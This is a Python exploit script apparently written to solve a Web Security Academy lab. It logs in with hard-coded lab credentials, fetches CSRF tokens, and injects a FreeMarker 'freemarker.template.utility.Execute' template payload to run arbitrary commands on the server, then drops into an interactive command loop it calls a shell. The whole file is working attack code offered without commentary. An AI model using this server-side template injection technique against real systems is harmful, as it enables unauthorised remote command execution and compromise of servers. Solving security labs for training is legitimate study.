import http.client
import random
import re
import ssl
import string
import urllib.parse

LAB_ID = "???"


def GET_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_login(
        session: str,
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': f'session={session}',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'csrf': csrf,
        'username': 'content-manager',
        'password': 'C0nt3ntM4n4g3r',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_product_template(
        session: str,
        product_id: int,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/product/template'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('productId', str(product_id)),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", '', headers)
    return connection.getresponse()


def POST_product_template(
        session: str,
        csrf: str,
        product_id: int,
        template: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/product/template'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('productId', str(product_id)),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    fields = [
        ('csrf', csrf),
        ('template', template),
        ('template-action', 'preview'),
    ]
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", body, headers)
    return connection.getresponse()


def login_csrf() -> tuple[str, str]:
    response = GET_login()
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name=\"csrf\" value=\"([a-zA-Z0-9]+)\"', response.read().decode('utf-8'))[0]
    return session, csrf


def login_session():
    session, csrf = login_csrf()
    response = POST_login(session, csrf)
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]


def product_csrf(session: str, product_id: int) -> str:
    response = GET_product_template(session, product_id)
    csrf = re.findall(r'name=\"csrf\" value=\"([a-zA-Z0-9]+)\"', response.read().decode('utf-8'))[0]
    return csrf


def random_str() -> str:
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))


def exec_command(
        session: str,
        command: str,
        product_id: int,
) -> str:
    beginning = random_str()
    end = random_str()
    response = POST_product_template(
        session=session,
        csrf=product_csrf(session, product_id),
        product_id=product_id,
        template=f"""<#assign ex = "freemarker.template.utility.Execute"?new()>{beginning}${{ex("{command}")}}{end}""",
    )
    response_body = response.read().decode()
    return re.findall(rf"(?s){beginning}(.*){end}", response_body)[0]


session = login_session()
product_id = 5
print("performing sanity check")
expected_str = random_str()
result = exec_command(session, f"echo {expected_str}", product_id)
if expected_str not in result:
    print("sanity check failed!")
    exit(1)
print("sanity check succeeded!")
print("shell opened")
while True:
    print(exec_command(session, input("input command: "), product_id))
